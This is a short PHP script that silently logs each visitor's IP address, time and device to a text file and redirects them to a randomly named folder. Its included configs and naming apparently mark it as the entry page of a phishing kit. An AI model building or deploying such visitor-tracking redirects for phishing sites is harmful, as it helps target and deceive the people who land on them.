<?php
include "./NV6588123/config/911.php";
include("./NV6588123/config/Sys.php");
  
	$ip = getenv("REMOTE_ADDR");
	$file = fopen("JN8.txt","a");
	fwrite($file,"IP=".$ip."/TIME=".gmdate ("Y-n-d")." ".gmdate ("H:i:s")."/DEVICE=".$user_os."\n");
header("Location: ./NV6588123/");
?>